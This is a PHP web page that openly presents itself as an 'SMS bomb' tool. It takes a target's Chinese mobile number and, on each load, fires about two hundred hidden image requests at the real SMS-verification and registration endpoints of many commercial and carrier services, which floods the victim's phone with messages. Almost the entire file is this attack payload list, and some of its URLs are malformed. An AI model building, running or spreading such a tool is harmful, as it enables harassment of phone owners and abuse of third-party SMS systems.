<!DOCTYPE html>
<html>
<head>
<title>迷你轰炸台 - 短信炸弹</title>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="css.css" rel="stylesheet" media="screen">
<style>
    body {
        margin: 5px;
    }
</style>
</head>
<body>
<div class="panel panel-success" style="margin-bottom: 0px;">
    <div class="panel-heading">
        <h3 class="panel-title">迷你轰炸台<span class="label label-success" style="float: right;" onclick="window.open('https://nais.me/', '_new')"><strong>由楠楠强力驱动</strong></span></h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">+86</span>
		<form method='GET' action='index.php'>
        <input type="text" name='hm' maxlength='11' class="form-control input-lg" placeholder="输入需要轰炸的号码" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸线程</button>
		</div>
		</form>

<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$d=$_GET['hm'];
?>
<?php
if($d>1){
	echo "<br /><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>
轰炸 <strong>$d</strong> , 第 <strong>$a</strong> 波攻击 , 已轰炸 <strong>N</strong> 次(不信请测试自己的手机号). <a href='https://nais.me/#faq' target='_blank'><i>楠楠</i></a>
</div>
</div>";
    echo "<div style='display:none'>
<img src='http://210.41.203.103/data/dx/index.php?hm=$d' alt=''/>
<img src='http://210.41.203.103/data/dx/index.php?hm=$d' alt=''/>
<img src='http://210.41.203.103/data/dx/index.php?hm=$d' alt=''/>
<img src='http://u.tieyou.com/api/user.html?act=checkMobileAccount&mobile=$d' alt=''/>
<img src='http://u.tieyou.com/api/user.html/?act=checkMobileAccount&action=u.user&mobile=$d' alt=''/>
<img src='https://passport.fang.com/loginsendmsm.api?MobilePhone=$d' alt=''/>
<img src='http://promotion.trip.taobao.com/platform/tripp_send_sms_screen.htm?_ksTS=1422022510111_178&callback=jsonp179&subActId=1391&phonenum= $d&callback=%24.validator.remoting.jsonpcb&_=1422024246251' alt=''/>
<img src=' http://ajax.huimaiche.com/Validate.ashx?callback=jQuery111006553893235977739_1422024246249&mobile= &authcookie=60aeHCYe3b6gem3m3m3Bm1lGpdI3axyepRjOeeiAUZQ9Ppft0m4cf$d&callback=window.Q.__callbacks__.cbt3d8g' alt=''/>
<img src='t http://passport.iqiyi.com/apis/phone/send_cellphone_authcode.action?requestType=7&serviceId=2&cellphoneNumber=$d' alt=''/>
<img src=' http://usercenter.12308.com/verifyCode/sendCode.sc?mobilePhone= $d&tcode=mqlogin' alt=''/>
<img src=' http://login.youku.com/user/smscode?mobile= $d&ref=ctrip&jsoncallback=jsonp1421821319281' alt=''/>
<img src=' http://qiche.tieyou.com/index.php?param=/ajax/sendBusActivityPushAppSms&mobile=$d' alt=''/>
<img src=' http://cpvip.ule.com/usr/getMobileValidateCode.do?jsonpCallback=jsonp1419507393210&_=1419507405579&userMobile=$d' alt=''/>
<img src=' http://smsspub.mail.163.com/mobileserv/fsms.do?callback=_tmp_jsonp_callback1419408928602&product=AndroidMail&template=ds23&mobile= $d&r=0.06689655710943043' alt=''/> 
<img src='http://qq.jd.com/new/mobileCode.action?username= $d&_tb_token_=hgS5rSdzN4K1tk2&_ksTS=1417944920144_368&callback=jsonp369' alt=''/> 
<img src='http://paimai.taobao.com/pmp/json/sendMobileCode.htm?method=send&mobilePhone=$d' alt=''/>
<img src=' http://www.ganxike.com/ajax/APhoneCode.aspx?phone=$d' alt=''/> 
<img src=' http://www.jumei.com/i/account/ajax_send_sms_for_mobile_register?mobile=$d' alt=''/>
<img src=' http://m.lefeng.com/index.php/user/getMess?mobileId=$d' alt=''/>
<img src=' http://www.ganxike.com/ajax/VRegister.aspx?UserID=$d' alt=''/>
<img src=' http://m.babytree.com/reg/get_code?tel=$d' alt=''/> 
<img src='http://www.baixing.com/m/oz/verify?mobile=$d' alt=''/> 
<img src='http://www.baixing.com/oz/verify?mobile= $d&Content=259471&_=1412151636195' alt=''/> 
<img src='http://msgservices.fdc.com.cn/MessageServicesHost.svc/SendMessage?jsoncallback=jQuery16106837893114425242_1412151608406&Phone=$d &r=0.42846162407658994' alt=''/> 
<img src='http://www.sheyingtg.com/ajax/sms.php?action=getverifycode1&mobile= &s=d2eb6b0d26b1bd6a95735347ab7bfb9d&t=1&act=mreg&id=20141001172704&rnd=0.9859699094668031' alt=''/> 
<img src='http://www.vpay8.com/login/uchecksms.aspx?p=$d &serviceId=2&callback=window.Q.__callbacks__.cbcjmyig' alt=''/>
<img src=' http://passport.iqiyi.com/apis/phone/send_cellphone_authcode.action?requestType=3&cellphoneNumber=$d' alt=''/>
<img src=' http://m.fang.com/user.d?m=phonelogin&city=heyuan&mstype=regist&burl=&phone=$d' alt=''/>
<img src=' http://crm.ws.ctrip.com/Promotion/sms/JsonpSendSMS.ashx?type=c41&callback=headFloat.MsgFB&tel=$d' alt=''/> 
<img src='http://passport.cngold.com.cn/Handlers/GetMobileValiCode.ashx?callback=jQuery17100520779222715646_1409319889719_=1409805005884&mobile=$d' alt=''/> 
<img src='http://www.cp2y.com/user/sendMobile.htm?_=1409191530888&mobile=$d' alt=''/>
 <img src='http://www.cp2y.com/user/sendMobile.htm?_=1409191531841&mobile=$d' alt=''/>
 <img src='http://passport.china.com/bindMobile.do?processID=sendMobileCheckCode&smk=c5e766fa-08d5-40c7-b274-de809c3e24ce&mobile=$d' alt=''/>
<img src=' http://user.kdnet.net/check_phone.asp?_=1409191535123&ajax=y&resendtel=$d' alt=''/>
<img src='  http://passport.fang.com/get_math_code.aspx?code=5730&codefor=$d' alt=''/> 
<img src='http://passport.baidu.com/v2/?regphonecheck&apiver=v3&isexchangeable=1&callback=bd__cbs__za1wka&phone=$d' alt=''/> 
<img src='http://dynamic.aq.xunlei.com/interface/sms?m=set_send&jsoncallback=jsonp1407852186356&mobile=$d' alt=''/>
 <img src='http://www.yikuaiqu.com/interface/accounts/sendphonebinding.php?v=0.127273319201143&phone=$d' alt=''/>
<img src=' http://www.houxue.com/pa/reg.php?act=data&flag=getRegVerifyCode&_=1409191540420&x_Cellphone=$d' alt=''/>
<img src=' http://m.passport.sohu.com/r/sendMVcodeaa?mobile=$d' alt=''/>
<img src=' http://bbs.360che.com/alone_ajax.php?action=ds21&inajax=1&ajaxtarget=ts&mobilenum=$d' alt=''/>
<img src=' http://www.500.com/wap/ajax.php?act=md&jsonpcallback=jsonp1409191545883&tel=$d' alt=''/> 
<img src='http://passport.mgyun.com/Register/SendVerifyCode?num=0.844612127898478&type=register&phone=$d' alt=''/>
<img src=' http://www.lsgw.com/RegmobileC.aspx?un=60BF1B0B020079AD5E4A0F935CD61F24&phone=$d' alt=''/> 
<img src='http://www.500.com/wap/ajax.php?act=md&jsonpcallback=jsonp1409191548900&tel=$d' alt=''/>
<img src=' http://m.ymeae.com/register/step2.php?pin=0_0_1380285261_8392248e36a8414cd6b3e45cc6a9c090&v=6&message=&username=dddfgfg&mobile=$d' alt=''/> 
<img src='http://vip.360che.com/Content/dealerClause/SendCaptcha.aspx?id=0.161853639136194&LinkmanCall=$d' alt=''/>
<img src=' http://shenzhen.lashou.com/ajax/signmobile.php?act=send_code&bind_mobile=$d' alt=''/> 
<img src='http://www.dianping.com/ajax/json/account/reg/mobile/send?callback=DP._JSONPRequest._2&m=$d' alt=''/>
<img src=' http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&r=0.719746434441789&txtLoginName=$d' alt=''/> 
<img src='http://highso.cn/customerRegister/obtainMobileAuthCode.do?again=0&random=0.4625208523981323&mobile=$d' alt=''/> 
<img src='http://m.jiayuan.com/ajax/get_reg_code.php?pin=0_0_1409191489645_b53399e813fe4a7f476d0d8e6e9250a7&v=6&t_code=1409191489645&mobile=$d' alt=''/>
<img src=' http://highso.cn/customerRegister/obtainMobileAuthCode.do?again=0&random=0.4992307333257983&mobile=$d' alt=''/>
<img src=' http://passport.zhubao.com/Register/send_sms?mobile=$d' alt=''/> 
<img src=' http://account.beva.com/newAccount/registerSmsCode?mobile= $d&_=1402554928130
<img src=' http://www.xtion.net/api/Register/GetValidateCodes/?MobileOrEmail=$d &_=1402554977169' alt=''/> 
<img src='http://www.fxiaoke.com/WebReg/GetInviteEmployeeInfo?mobileOrEMail=$d' alt=''/>
<img src=' http://wq.jx163.com/login_new_code/regis/getSMSValidCode1UL.action?ver=0.8235203230313742&cmd.terminalCode=$d' alt=''/> 
<img src='http://g.10086.cn/eguc/register/smsVerificationCodeAjax?tel=$d' alt=''/> 
<img src='http://my.tv189.com/site/sendMessageCode?_=1399442866473&mobile= $d?t=0.8064816420604055' alt=''/>
<img src=' http://passport.kongzhong.com/ajax/sendsmscode/reg/$d &id=0.6346626054287636' alt=''/>
<img src='  http://r.meadjohnson.com.cn/api_verifycodet.aspx?phone=$d' alt=''/>
<img src=' http://union.ijinshan.com/index.php?a=send_valid_sms&phone=$d' alt=''/>
 <img src='http://www.aapinche.cn/account/mobile.aspx?do=getcode&Mobile=$d &flag=1&timestamp=1400051009495' alt=''/> 
<img src='http://www.callingme.com.cn/sendMessageWithPhone?phone=$d &intent=0&_=1400051021935' alt=''/> 
<img src='http://www.duomi.com/users-getcaptcha?mobile= $d&module=send_phone_auth_code_vip' alt=''/>
<img src=' http://www.ganji.com/ajax.php?phone= &recomid=$d' alt=''/> 
<img src='http://www.pyt365.net/Account/GetVerification?number=$d' alt=''/>
<img src=' http://www.souche.com/pages/sendMessageAction/sendMessage.json?phoneNumber=$d' alt=''/> 
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$d' alt=''/>
<img src=' http://reg.zhixiaoren.com/sms/?mobile=$d &amp;module=send_phone_auth_code_vip &amp;condition=2&amp;r=0.2291404186565223&amp;callback=QiUserJsonP1404186565970' alt=''/>
<img src=' http://i.360.cn/smsApi/sendsmscode?account=$d &amp;t=0.3571404186565344' alt=''/>
<img src=' http://t.sdo.com/home/SendSms?mobile=$d 
<img src='http://www.taomingshi.com/index.php?r=login/sendCode&amp;phone=$d' alt=''/>
<img src=' http://www.iyoukahui.com/member/sendcode/mobile:$d &amp;t=0.1802131057167214' alt=''/> 
<img src='http://www.joybtc.com/zh-cn/user/send_sms.php?a=reg&amp;p= $d&amp;callback=jsonp_334311404359535393' alt=''/>
<img src=' http://my.3533.com/mobilereg/sendsms/?mobile=$d &amp;type=0' alt=''/> 
<img src=' http://sso.letv.com/user/mobileRegCode/mobile/ &amp;tokenKey=$d&amp;_ksTS=1404359536427_49&amp;callback=jsonp50' alt=''/>
<img src=' http://my.m.taobao.com/ajax/sendSms.do?flag=3&amp;phone=$d' alt=''/>
<img src=' http://bbs.coolpad.com/coolyun/CoolRegisterGetAuthCode.php?cyno=$d' alt=''/>
<img src=' http://wuhan.baixing.com/oz/mobileCode/?mobile=$d' alt=''/>
<img src=' http://wuhan.baixing.com/oz/verify/x/reg?mobile=$d' alt=''/> 
<img src='http://www.to8to.com/my/get_moblie_yz.php?moblie=$d' alt=''/> 
<img src='http://www.myzhongjin.com/Member/SendMobileCodeOfRegister?rn=0.4688350945374146&amp;mobile=$d' alt=''/>
<img src=' http://shenzhen.baixing.com/oz/verify/x/reg?mobile=$d &amp;msg=TGOSLb6eac944c63140d1b707e6dabaeae411-1-204292500-1&amp;clientVersion=2.3.1&amp;endpointOS=ios' alt=''/>
<img src=' http://woa.bianfeng.com/woa/autologin/receiveVerificationSms.shtm?phone=$d' alt=''/>
<img src=' http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=110%201168869508&amp;mobile=$d' alt=''/> 
<img src='http://my.tv.sohu.com/user/reg/sendms.do?passport=$d' alt=''/> 
<img src='http://www.lecai.com/user/ajax_register_phone_authcode_send.php?phone=$d' alt=''/>
<img src=' http://my.zto.cn/Account/GetPhoneCheckCode?mobile=$d &_=1407727355613' alt=''/> 
<img src='http://gwpassport2.woniu.com/v2/sendsms_h9fp972k?jsoncallback=jQuery17204924182975073772_1407727355434&mobile=$d' alt=''/>
<img src=' http://passport.cngold.org/account/mobileCode.htm?callback=jsonp1407729986476&member.mobile=$d &yy=0' alt=''/> 
<img src='http://www.ebadu.net/xm_ljs.asp?ids=$d' alt=''/>
<img src=' https://feixin.10086.cn/account/RegisterCodeDiv?mobileno=$d &type=C27&detailId=-1&callback=Floating.MsgRp&rd=0.2406133026815951' alt=''/>
 <img src='http://crm.ws.ctrip.com/Promotion/sms/JsonpSendSMS.ashx?tel=$d' alt=''/>
<img src=' https://www.yypt.com/finance/regist!sendValidateCode.do?mobile=$d' alt=''/>
<img src=' http://member.88.com.cn/user/getmobilecode.html/?ac=send&mobile= $d&_=1407124716359' alt=''/> 
<img src='http://ac.ppdai.com/validatecode?callback=jQuery17108819785887872924_1407124610768&ValidateType=Mobile&MobilePhone=$d' alt=''/>
<img src=' https://www.firstp2p.com/user/MCode/?type=1&isrsms=0&t=1407124856875&mobile= $d&_action=checkMoblie' alt=''/> 
<img src='http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=$d &_action=sendValidationCode &citySelect=11000000&proSelectedtext=%E5%8C%97%E4%BA%AC&citySelectedtext=%E5%8C%97%E4%BA%AC&cooperator=&next=0.3737380872480571' alt=''/> 
<img src='http://www.epicc.com.cn/ecar/proposal/checkmobile/?addCheckValuesFlag=&areaCode=11000000&mobile=$d &CallBack.customerCName=%E6%9D%8E&CallBack.priority=0&CallBack.areaCode=11000000&IsblackFlag=0&addCheckValuesFlag=0&ccaFlag=0&cityCode=11000000&proposalFinished=false&next=0.37693149223923683' alt=''/>
<img src=' http://www.epicc.com.cn/ecar/followup/callBack/saveCustomerToHF?time=1407125058704/?CallBack.mobile=$d /REG_MOBILE/ec526aca3bdf5a81dd8d96ad521134da?_=1403700491564 ' alt=''/> 
<img src='http://m.ctrip.com/html5/ClientData/SendVerifyCode/ &Password=0e831a33923e4725ee279f645ffb717ae4d011f9a19e1c4252027741156d135f6c58737223feab36bac4e3a1a434c52a3b7395d01e5f68ca81a6e0c8215601c1fe5b1eaa53db6fb23f3cc09338438a50a25c9e3f50a02574df233c8a313c634c9c50aaa88f1b6d2ef679aa3a53638d8ac9fa46354d16927e253f7c44970fa3e2&Sales=&SourceId=$d' alt=''/>
<img src=' http://m.ctrip.com/html5/Account/UserRegister/?UID=$d' alt=''/> 
<img src='http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?r=0.3434412432940654&popType=&LoginName=$d' alt=''/> 
<img src='http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?popType=0&r=0.8167970664799213&LoginName=$d' alt=''/>
<img src=' http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile= $d&qr=1' alt=''/>
<img src=' http://w.sohu.com/t2/tologin.do?mnd= http://passport.sohu.com/regist/send_sms/?mobile=$d 
<img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=$d' alt=''/>
<img src=' http://www.kuaiyoujia.com/Register/GetVerificationCodeOnRegist/?mobile= $d&isCheckCode=1' alt=''/>
<img src=' http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=$d' alt=''/>
<img src=' http://u.tieyou.com/api/user.html?act=checkMobileAccount&mobile=$d' alt=''/> 
<img src='http://u.tieyou.com/api/user.html/?act=checkMobileAccount&action=u.user&mobile= $d&password=asdfghjkiu&agree=true' alt=''/> 
<img src='http://m.passport.sohu.com/r/mobile?mobile=$d' alt=''/> 
<img src='http://www.ximalaya.com/passport/mobile/getVerifyCode/?msgType=4&phone_num=$d' alt=''/>
<img src=' http://3g.500.com/api/sendcode?mobilenum=$d &regbinding=0' alt=''/>
<img src=' https://passport.bankcomm.com/ajax.php/?a=sendvcode&uname=$d &sid=5c27553bd5524170c515edd6ffba88fa' alt=''/> 
<img src=' https://passport.m.jd.com/user/getCode.json?&mobile=$d' alt=''/>
<img src=' https://passport.m.jd.com/user/getCode.action?mobile=$d' alt=''/>
<img src=' http://zhoukou.baixing.com/oz/verify/x/reg?mobile=$d' alt=''/> 
<img src=' http://zhoukou.baixing.com/oz/voice/?mobile=$d' alt=''/>
<img src=' http://zhoukou.baixing.com/c/ic/voiceCode 
<img src='http://zhengzhou.baixing.com/oz/verify/x/reg?mobile=$d' alt=''/>
<img src=' http://zhengzhou.baixing.com/oz/voice/?mobile= $d&_=1407073499462' alt=''/>
<img src='  http://login.tudou.com/passport/sendSmsMsg.do?jsoncallback=jQuery17209491650222335011_1407073475324&type=0&mobile= $d&submit=1&verify_param=7a8654f998c7608fb56e80e0f8a44ad3' alt=''/> 
<img src='http://3g.51job.com/my/register.php/?phone=$d &submit=1&time=1407074694
<img src=' http://3g.51job.com/my/register.php?topage=3&verify_param=74eaa3ff5a1ede46f2d98d8b393be1f3&phone=$d' alt=''/>
<img src=' http://218.200.227.123/order/cmnet/goto_validate_code/?msisdn=$d' alt=''/>
<img src=' http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile= $d&type=5' alt=''/>
<img src=' http://m.51job.com//ajax/in/getphonecode.ajax.php?phone=$d &apptype=4' alt=''/>
<img src=' http://my.51job.com/AjaxAction/mobile_code/send_mobile_code.php/?mobile= $d&r=0.41990769281983376' alt=''/>
<img src=' http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=$d' alt=''/>
<img src=' https://register.shengpay.com/personal/sendRegisterSms.htm/?mobile= $d&r=0.0194694004021585 &msgType=01' alt=''/>
<img src=' https://user.95516.com/uc-cdhd-web/rest/reg/sendmobilecaptcha/?mobile=$d &callback=jQuery171007485370174981654_1407076493305&_=1407076509842' alt=''/>
<img src=' http://data.zgzcw.com/newzgzcw/sendMessage.jsp?mobile= $d&act=md&jsonpcallback=jsonp1407076681822' alt=''/>
<img src=' http://www.500.com/wap/ajax.php?tel= &babyBirthday=20140102 &isphone=$d' alt=''/> 
<img src='http://www.zsye.com/applyServlet/?userid=637810&opretype=2&sourceName=GW&isHOME=try.jsp&phone=$d &password=qweasda&tj_custid=0&verify=e33fe4723f457dee' alt=''/> 
<img src='http://zg51.net/web/register_up.asp/?mobile= &channel=$d' alt=''/>
<img src=' http://pim.10086.cn/ajax/mt.php/? crumb=a9a9d88835a09adbeada414c9fa44b4d&mobile=$d' alt=''/>
<img src=' https://caiyun.feixin.10086.cn/Mcloud/sso/sendmsms.action/? date=1407077678283&account=$d' alt=''/>
 <img src='http://cbc.iuoooo.com/Register/GetAuthCode/? LoginCode=$d' alt=''/>
<img src=' http://hwid1.vmall.com:8080/oauth2/oauth2/ajaxHandler_in/getMobileValiCode?mobile=008613281116967&smsReqType=4&session_code_key=p_reg_phone_session_ramdom_code_key&reqClientType=26&pageToken=xdwMu5EeUPC7xkKLdHWcsdSFxZg8TxYC&lang=zh&reflushCode=0.9925481270270826 &_=$d' alt=''/> 
<img src='http://passport.115.com/?ct=ajax&ac=ajax_register_validate&reg[mobile]=$d' alt=''/>
<img src=' http://passport.115.com/?ct=ajax&ac=ajax_smscode&_token=1c3bcfwLc1rPQtERvs4h5Ejb1klfGnFca8T0FGY5BvexelJ2opj4ZxzsWAeTvQyI8VmdNziXlGSA&m= &_=$d' alt=''/> 
<img src='http://passport.115.com/?ct=ajax&ac=ajax_chekuser&account=113281116967&type=mobile&val= &condition=2&r=0.9476780155673623&callback=QiUserJsonP1407482642243 &_=$d' alt=''/> 
<img src='http://id.ourgame.com/passport!exist.do?passport= &callback=jQuery16405770837608724833_1407483725809&_=$d' alt=''/>
<img src=' http://weburs.ku.163.com/quickReg/sendMobileCaptcha?promark=31j8lmq9&id=null&output=json&m_username= &callback=jQuery16409621100642252713_1407483945550&_=$d' alt=''/>
<img src=' http://weburs.ku.163.com/quickReg/sendMobileCaptcha?promark=ab47ge1s&id=null&output=json&m_username= &_=$d' alt=''/> 
<img src='http://gwpassport2.woniu.com/v2/sendsms_h9fp972k?jsoncallback=jQuery17209502564975991845_1407483940698&mobile= &_csrf_token_=m6bptqecyqv0&t=$d' alt=''/> 
<img src='http://cn.ae.aliexpress.com/wsuser/join/SmsSenderAjax.htm/?mobileNo=$d' alt=''/> 
<img src='https://aq.99.com/AjaxAction/AC_register.ashx/?action=verifyusernameofmobile&txtUserNameOfMobile=$d' alt=''/>
<img src=' https://aq.99.com/AjaxAction/AC_register.ashx?url=$d' alt=''/>
<img src='http://www.99.com/?action=createcodeofmobileregister&txtUserNameOfMobile=$d' alt=''/> 
<img src='http://reg.ztgame.com/registe/sendMobileCode/?check=&phoneNum=$d' alt=''/> 
<img src=' http://www.169money.com/AjaxWeb/AddBmFailure.ashx?0.36719161039218307/?UserName=&UserTel= $d&siteid=4882386&bdcbid=e63c8936-55d6-4d23-9046-d28550cf2f5d&code=E0F7B4FACD65AA17859DBBEA70811673ED3E72AAF845B28CE932C0B27C93E9D6672119895F9A72806F03512459789F986A08049390A06C3B494320DA607CFCE70C8CC66A82FBE41C21242BBCC526AD52A18DEFF09E8AF158E37BBF0CE925562D&t=1407485335002&callback=_lxb_jsonp_hyl8ff16_' alt=''/> 
<img src='http://lxbjs.baidu.com/float/_c.js?vtel= $d&xf=json' alt=''/> 
<img src='http://new.i139.cn/umswx/xyyx/sendAndSmsCode.do?phonenum=$d' alt=''/>
<img src=' http://www.36936.com/handler/RegUserSendSms.ashx?&type=1&mobile=$d' alt=''/> 
<img src='https://security.9666.cn/register/sendPhoneCodeAjax.action?phone=$d' alt=''/> 
<img src='http://shenzhen.lashou.com/ajax/signmobile.php?act=checkmobile&mobile=$d' alt=''/> 
<img src='http://www.quxinwang.com/Codes/Register.aspx?&_=1407633645592&tag=getcode&un=$d &sid=182328dc09ecd4eee908708e0bfd5496 &r=0.9010949897739119' alt=''/>  
<img src='https://passport.jd.com/emReg/isMobileEngaged?mobile=$d' alt=''/> 
<img src=' http://sso.letv.com/user/mobileRegCode/mobile/= /mobilecodeletvid/k961601363512388 /mobilecodeletvid/f219111395819034 /mobilecodeletvid/c326961366927138 ?jsonp=jQuery17103937588292174041_1405268556755&_=$d' alt=''/> 
<img src=' http://sso.letv.com/user/checkMobileExists/mobile/ ?jsonp=jQuery17103937588292174041_1405268556754&_=1405268579859 ?jsonp=jQuery171008569038612768054_1402390605865&_=$d' alt=''/>  
<img src='http://218.28.199.137/m/mobile/registerSms/?mobile=$d' alt=''/>  
<img src='http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=$d' alt=''/> 
<img src=' http://211.152.60.227:8029/Api/index.php/Member/registerValidateCode/?phone=$d' alt=''/> 
<img src=' http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=$d &act=0' alt=''/>  
<img src='http://180.168.178.213:8888/MemberMag.asmx/SendVeCode?sob_password=d5299c2fe78d75a37b0d3f4715d678bb&sob_code=79388bb8a33bbe3d403d7e76d6d12d24&sob_hotelgroup_id=8d5e957f297893487bd98fa830fa6413&phoneNum=$d' alt=''/> 
<img src=' http://114.112.174.170/serviceCor/regfirst.action?mobile= &content=%C4%FA%B5%C4%D7%A2%B2%E1%D1%E9%D6%A4%C2%EB%CA%C7%3A476948&sendtime=$d' alt=''/> 
<img src=' http://111.1.37.36:8686/link_smssend.asp?username=wzysba&password=wzysba&mobile=$d' alt=''/>  
<img src='https://caiyun.feixin.10086.cn/Mcloud/sso/sendmsms.action/?date=1407077678283&account=     $d' alt=''/> 
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://www.epweike.com/index.php?do=ajax&view=send_code&auth=register&type=mobilemobile=$d' alt=''/>
<img src='https://api.weibo.com/2/statuses/repost.json=$d' alt=''/>
<img src='http://www.anxin.com/ajax/ajax.ashxCmd=getregsms&mobile=$d' alt=''/>
<img src='https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86$d&operation=start&ts=$d' alt=''/>
<img src='http://promotion.trip.taobao.com/platform/tripp_send_sms_screen.htm?_ksTS=1422022510111_178&callback=jsonp179&subActId=1391&phonenum= $dcallback=%24.validator.remoting.jsonpcb&_=1422024246251 ' alt=''/>
<img src='https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B86$d&operation=start&ts=$d' alt=''/>
<img src='http://passport.cnyw.net//ajax.php?action=getverify&mobile=$d' alt=''/>
<img src='http://www.kunlun.com/?act=ajax.registGetMobileCode&mobile=$d&type=regist' alt=''/>
<img src='http://www.vko.cn/sendmobile.html?phone=$d&{}&_=1355879411734' alt=''/>
<img src='http://passport.colourlife.com/site/SendMsg?mobile=$d&type=0&_=1406056377573W' alt=''/>
<img src='http://www.19online.cn/inc/reg.ashx|action=getregmobilecode&mobile=$d' alt=''/>
<img src='http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&mobile=$d' alt=''/>
<img src='http://www.lecai.com/user/ajax_register_phone_authcode_send.php?phone=$ ' alt=''/>
<img src='http://www.gewara.com/ajax/mobile/register.xhtml?mobile=$d&captchaId=&captcha=' alt=''/>
<img src='http://w.sohu.com/t2/tologin.do?mnd=$d&qr=1' alt=''/>
<img src='http://wap.dm.10086.cn/X/o/3455101/447117/mva0?a=/enduser/querySMSValiCodeByWap20.action&templateDir=template&theme=simple&name=querySMSValiCode&id=querySMSValiCode&downId=&operateType=1&isPass=true&user.accountName=$d&Submit=%E4%B8%8B%E4%B8%80%E6%AD%A5' alt=''/>
<img src='http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&mobile=$d&p=72' alt=''/>
<img src='http://read.10086.cn/www/firstpage/getValidateCode.action?phone=$d&sf=0' alt=''/>
<img src='http://read.10086.cn/www/NiceNameAjax?msisdn=$d&e_cm=cmmobile' alt=''/>
<img src='https://cmpay.10086.cn/service/send_chk_no.xhtml?REG_MBL_NO=$d&SMS_CD=URM001&typ=Y&r=0.9636801626045905' alt=''/>
<img src='https://feixin.10086.cn/account/RegisterLv3Ajax?stype=m&stext=$d' alt=''/>
<img src='http://my.feixin.10086.cn/password/findpasswordvalidate?type=0&account=$d' alt=''/>
<img src='http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=$d' alt=''/>
<img src='http://go.10086.cn/index.do?method=doReg&mobile=$d&source=reg' alt=''/>
<img src='http://www.keepc.com/registerForMobileForCode.act?mobileNo=$d' alt=''/>
<img src='http://wap.cmread.com/sso/oauth2/msisdnRegister?e_l=1&amp;f=7718&amp;pg=221&msisdn=$d&passwd=1415926' alt=''/>
<img src='https://passport.jd.com/emReg/isMobileEngaged?mobile=$d&r=0.08241349037594953' alt=''/>
<img src='http://shoujibao.net/pams2/m/s.do?j=l&c=31879&p=73&mobile=$d&password=1415926' alt=''/>
<img src='http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=$d' alt=''/>
<img src='http://www.huggieshappyclub.com/Handler/Vcode.ashx?mobile=$d' alt=''/>
<img src='http://wap.buidq.com/wap/webcallService.aspx?tel=$d' alt=''/>
<img src='http://www.uwewe.com/get/IsUser.aspx?phone=$d&quhao=86' alt=''/>
<img src='http://www.uwewe.com/get/SendMessage.aspx?phone=$d&ccode=86&type=1' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://t.12580.com/special/sendValidcodeByWap.do?mobile=$d&valicode=' alt=''/>
<img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=$d' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/k961601363512388' alt=''/>
<img src='http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=$d&isCheckCode=1' alt=''/>
<img src='http://m.10086.cn/wireless/n-migu/regbox.htm?q=$d&id=3772&k=002000a' alt=''/>
<img src='http://www.skywldh.com/registerForMobileForCode.act?mobileNo=$d&smSecurityCode=' alt=''/>
<img src='http://wap.skywldh.com/index.php?register&flag=flag&phone=$d&mss=on' alt=''/>
<img src='http://zg51.net/web/customer/forgetPwd_up.asp?customermobile=$d&verify=01f735f97f1af959&checkcodeflag=1' alt=''/>
<img src='http://www.qqvoice.com/free/getExpCode.do?_isAjaxRequest=true&phonemail=$d&type=1&randvalue=' alt=''/>
<img src='http://www.feiin.com/findAsidountInfoByAsidount.act?mobile=$d' alt=''/>
<img src='http://wap.feiin.cn/index.php?register?phone=$d' alt=''/>
<img src='http://www.feiin.cn/bindMobileCode.act?asidount=$d&quhao=0086' alt=''/>
<img src='http://hm.baidu.com/hm.gif?cc=1&ck=1&cl=16-bit&ds=1280x800&ep=%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81*%E7%82%B9%E5%87%BB&et=4&fl=11.6&ja=1&ln=zh-cn&lo=0&nv=1&rnd=2125197633&si=4cd143d67831005438c65f586314c582&st=3&su=$d' alt=''/>
<img src='http://www.wcall.net/ajax/send_captcha.jsp?mobile=86$d' alt=''/>
<img src='http://www.uwewe.com/wap/reg.aspx?__VIEWSTATE=%2FwEPDwUKLTg3MDQ4MjcyNGRkTWAEkK5GOtWg8l1At7LuQLJsrtk%3D&__EVENTVALIDATION=%2FwEWBwLf79jTDQL7h7XWDwKd%2B7q4BwLinreAAgLChPzDDQK7q7GGCAKM54rGBiIS9Dt7i1j1h%2BDtH9EcyHIWJVZf&txtacct=$d&txtpwd=&txtRepwd=&txtCode=&Button2=%E8%AF%AD%E9%9F%B3%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81' alt=''/>
